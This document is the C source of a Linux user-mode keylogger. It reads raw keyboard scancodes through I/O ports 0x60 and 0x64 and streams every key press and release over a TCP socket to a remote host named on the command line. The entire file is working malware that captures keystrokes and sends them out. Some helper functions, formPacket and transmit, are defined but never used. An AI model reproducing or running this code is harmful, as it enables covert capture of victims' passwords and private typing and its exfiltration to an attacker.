/*
 * File: keylogger.c
 * Description: Main file for a linux user-mode keylogger
 * Author: Christopher A. Wood, caw4567@rit.edu
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <netinet/in.h>
#include <netdb.h> 
#include <pthread.h>
#include "keymap.h"

// header files for standard linux functions
#include <sys/io.h>
#include <sys/types.h>

// Keyboard definitions
#define KEYBOARD_STATUS_PORT 0x64 // this is system dependent
#define KEYBOARD_PORT 0x60        // this is system dependent
#define TABLE_SIZE 128

// Packet buffer size
#define BUFSIZE 32

// all-in-one key data structure definition
typedef struct _KEY_DATA {
	char keyCode[TABLE_SIZE];
} KEY_DATA, *pKEY_DATA;

// global socket information (no encapsulation necessary since this is a standalone program)
int sockfd;
struct sockaddr_in serveraddr;
struct hostent *server;

// Function prototypes
void formPacket(char keyCode, char *buffer);
void transmit(char *buffer);
void error(char *msg);

/* 
 * Error - wrapper for perror.
 */
void error(char *msg) {
	perror(msg);
	exit(0);
}

/*
 * Main function to set up the keylogger and run the main loop
 *
 * @param argc - number of cmd line arguments
 * @param argv - cmd line argument strings
 */
int main(int argc, char** argv) 
{
	int status;
	int oldKey;
	int i;
	char key, tempKey;
	char table[TABLE_SIZE];
	char *hostname;
	int portno;
	int numBytes;
	char buffer[BUFSIZE];

	long timeMillis = 0;
	struct timeval tv;

	/* check command line arguments */
	printf("Checking arguments...\n");
	if (argc != 3) {
		printf("usage: main <hostname> <port>\n");
		exit(0);
	}
	printf("passed.\n");
	hostname = argv[1];
	portno = atoi(argv[2]);

	/* socket: create the socket */
	printf("Trying to create socket...\n");
	sockfd = socket(AF_INET, SOCK_STREAM, 0);
	if (sockfd < 0) 
	{
		error("ERROR opening socket");
	}

	/* gethostbyname: get the server's DNS entry */
	printf("Trying to retrieve destination host...\n");
	server = gethostbyname(hostname);
	if (server == NULL) {
		fprintf(stderr,"ERROR, no such host as %s\n", hostname);
		exit(0);
	}

	/* build the server's Internet address */
	printf("Building the address information...\n");
	bzero((char *) &serveraddr, sizeof(serveraddr));
	serveraddr.sin_family = AF_INET;
	bcopy((char *)server->h_addr, (char *)&serveraddr.sin_addr.s_addr, server->h_length);
	serveraddr.sin_port = htons(portno);

	/* connect: create a connection with the server */
	if (connect(sockfd, &serveraddr, sizeof(serveraddr)) < 0) 
	{
		error("ERROR connecting");
	}
	
	// zero out the table
	memset(table, 0, TABLE_SIZE);
	memset(buffer, 0, BUFSIZE);
	
	// entry message
	printf("Entering keylogger...\n");
	
	// set up permissions to use the keyboard ports
	printf("Enabling permissions on a port...\n");
	if (ioperm(KEYBOARD_PORT, 1, 1) == -1) {
		printf("ioperm() for keyboard port %x failed.\n", KEYBOARD_PORT);
		return -1;
	}
	
	if (ioperm(KEYBOARD_STATUS_PORT, 1, 1) == -1) {
		printf("ioperm() for keyboard status port %x failed.\n", KEYBOARD_STATUS_PORT);
		return -1;
	}
	
	// main loop
	status = key = 0;
	while (1) 
	{
		// determine if the keyboard port is ready to be read from
		status = inb(KEYBOARD_STATUS_PORT);

		if (status == 20) // ready to read from keyboard
		{
			// read in the character from the keyboard
			oldKey = key;
			key = inb(KEYBOARD_PORT);

			// check validity of keyboard character 
			if ((key < TABLE_SIZE) && (oldKey != key)) 
			{
				if (table[key] != 1)
				{
					if (key >= 0)
					{
						sprintf(buffer, "%d %s", key, "KEY_DOWN");
					}
					else
					{
						sprintf(buffer, "%d %s", key + 128, "KEY_UP");
					}
					
					tempKey = key;
					write(sockfd, buffer, BUFSIZE);
				}	
			}
		}
		
		// don't hold up the system
		usleep(100); 
	}
}

/**
 * Routine to form the packet for transmission
 *
 */
void formPacket(char keyCode, char *buffer)
{
	int up = 0;
	long timeMillis = 0;
	struct timeval tv;
	gettimeofday(&tv, NULL); // NULL because we don't are about the time zone 
	timeMillis = (tv.tv_sec) * 1000 + (tv.tv_usec) / 1000;

	// convert the scancode to the corresponding character
	char key = scancodeMap[keyCode];

	// Determine press/release status
	if (keyCode >= 0)
	{
		// packet: (time, keycode, up)
		sprintf(buffer, "%d %d %s", timeMillis, keyCode, "KEY_DOWN");
	}
	else
	{
		// packet: (time, keycode, up)
		sprintf(buffer, "%d %d %s", timeMillis, keyCode + 128, "KEY_UP");
	}
}

/**
 * Routine to transmit a packet to the (preconfigured) destination host.
 *
 * @param buffer - a string buffer to send to the host
 */
void transmit(char *buffer)
{	
	write(sockfd, buffer, strlen(buffer));
}
